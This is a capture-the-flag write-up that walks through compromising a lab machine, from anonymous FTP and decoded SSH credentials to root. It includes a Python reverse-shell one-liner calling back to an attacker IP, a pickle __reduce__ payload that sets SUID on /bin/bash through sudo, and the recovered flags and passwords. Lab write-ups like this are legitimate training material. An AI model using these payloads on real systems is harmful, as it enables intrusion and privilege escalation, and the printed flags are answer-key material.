---

### Challenge properties:
- ##### Difficulty: medium
- ##### Techniques: scanning, enumeration, anonymous FTP access, binary decoding, pickle deserialization, Python decompilation (PyInstaller), SSH pivoting, sudoers misconfiguration, insecure deserialization RCE, privilege escalation.
- ##### Tools: nmap, ftp, python3 (pickle, marshal, pickletools), pyenv, pyinstxtractor, uncompyle6, netcat, sshpass, sudo.

### Challenge steps:

#### Part 1: user.txt

1. Basic nmap scan on the target IP.
	-> `nmap 10.10.0.2`
	Output:
	-> `21/tcp open ftp`
	-> `22/tcp open ssh`

2. Anonymous FTP login (`anonymous` / empty password).
	-> `ftp 10.10.0.2`
	-> `Name: anonymous`
	-> `Password: ` (empty)

3. Directory listing shows two files: `.yggdrasil.cache` and `poem.txt`.
	-> `get .yggdrasil.cache`
	-> `get poem.txt`
	-> `cat .yggdrasil.cache`
	-> `cat poem.txt`

	`poem.txt` contains an Old Norse excerpt referencing Fenrir and Ragnarök, a purely thematic hint with no direct technical use, left aside.

4. `.yggdrasil.cache` is decoded in two steps: first a long binary string (`0`/`1`) grouped into 8-bit chunks to get raw bytes, then those bytes turn out to be a **Python pickle (protocol 4)** holding a dictionary of indexed characters (`ssh_userN` / `ssh_passN`) to reassemble in order. This gives the SSH credentials:
	-> `USER: fenrir`
	-> `PASS: I_will_kill_odin_during_ragnarok`

5. SSH login with these credentials.
	-> `sshpass -p 'I_will_kill_odin_during_ragnarok' ssh fenrir@10.10.0.2`

6. Fenrir's home directory contains a compiled Python bytecode file, `mjollnir.pyc`. Decompiling it (after identifying the Python version via its magic number, retrieving it with `scp`, and decompiling with `decompyle3`) reveals a socket server (port 7432) that asks for a `Username`/`Password` stored as long integers (`bytes_to_long`), and once logged in, executes **any** received command with no restriction via `subprocess.Popen(command, shell=True)`.

	Converting these integers back to text gives the service's credentials:
	-> `USER: jormungandr`
	-> `PASS: Jag_ar_Jormungandr_midgardsormen`

7. This service listens on all interfaces of the machine (`0.0.0.0`), not just locally. Connect directly from the attacking machine.
	-> `nc 10.10.0.2 7432`
	-> `Username: jormungandr`
	-> `Password: Jag_ar_Jormungandr_midgardsormen`

8. Once logged in, a pseudo-shell (`C:\User\Jormungandr>`) executes our commands. `user.txt` is directly readable.
	-> `cat home/jormungandr/user.txt`
	-> `EPI{k0mi0_a0_5kUlDAD09Um}`

#### Part 2: root.txt

1. Checking jormungandr's sudo rights.
	-> `sudo -l`
	-> `(root) NOPASSWD: /opt/ragnarok/ragnarok`

2. `/opt/ragnarok/ragnarok` is a PyInstaller executable (Python 3.5). Run directly, it shows an interactive prompt.
	-> `This is the end of time! Choose your last meal before battle!`
	-> `meal:`

3. The netcat shell isn't interactive, so there's no way to answer this prompt. Getting a reverse shell with a pty.

	Listener on the attacking side:
	-> `nc -lvnp 4444`

	From the jormungandr pseudo-shell:
	-> `python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("MY_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'`

4. Extracting and decompiling the binary to understand its logic. Grabbing the whole folder:
	-> `scp -r fenrir@10.10.0.2:/opt/ragnarok /tmp/ragnarok_dump`

	The embedded `.pyc` is compiled for Python 3.5.0 (magic number `160d0d0a`).

5. `pyinstxtractor` (the tool that unpacks a PyInstaller executable to extract its `.pyc` files) works by reusing the `marshal` module of whichever Python interpreter runs it. The `marshal` format changes between major Python versions and isn't backward-compatible: running the extractor with the system's Python (here 3.11) produces a corrupted `.pyc` that no decompiler can read afterwards. The extraction has to be done with a Python version matching the one used to compile the binary, i.e. 3.5.

	Installing this dedicated interpreter via `pyenv` (a Python version manager), then activating it in the current shell:
	-> `pyenv install 3.5.10`
	-> `pyenv shell 3.5.10`

	Extracting the PyInstaller binary with this Python 3.5:
	-> `wget https://raw.githubusercontent.com/extremecoders-re/pyinstxtractor/master/pyinstxtractor.py`
	-> `python3 pyinstxtractor.py ragnarok`

6. Decompiling with a 3.5-compatible `uncompyle6` version:
	-> `pip install "uncompyle6==3.7.4"`
	-> `uncompyle6 ragnarok.pyc`

	Recovered source:
	```python
	entered = input('meal: ')
	data = base64.b64decode(entered)
	meal = pickle.loads(data)
	print('Your meal is:', meal)
	```
	User input → base64 → `pickle.loads()` with no validation at all. A classic insecure deserialization flaw, exploitable for RCE.

7. Malicious pickle payload exploiting `__reduce__` to run a command:
	```python
	import pickle, os, base64

	class Exploit:
	    def __reduce__(self):
	        return (os.system, ('chmod +s /bin/bash',))

	print(base64.b64encode(pickle.dumps(Exploit())).decode())
	```
	-> `gANjcG9zaXgKc3lzdGVtCnEAWBIAAABjaG1vZCArcyAvYmluL2Jhc2hxAYVxAlJxAy4=`

8. From the reverse shell (jormungandr), running the binary through `sudo` and feeding it the payload:
	-> `sudo /opt/ragnarok/ragnarok`
	-> `meal: gANjcG9zaXgKc3lzdGVtCnEAWBIAAABjaG1vZCArcyAvYmluL2Jhc2hxAYVxAlJxAy4=`

	The pickle deserializes and `os.system('chmod +s /bin/bash')` runs as root (the binary itself runs via `sudo`), setting the SUID bit on `/bin/bash`.

9. Privilege escalation:
	-> `ls -la /bin/bash` → `-rwsr-sr-x 1 root root ...`
	-> `/bin/bash -p`
	-> `id` → `euid=0(root)`

10. One last trap: `root.txt`'s filename contains invisible Unicode curly quotes. `cat root.txt` fails. Bypassed with a glob:
	-> `cat *root.txt*`
	-> `EPI{d3N_hAr_GudarNa2_ErA_GaR_m0T_sITT_sluT}`
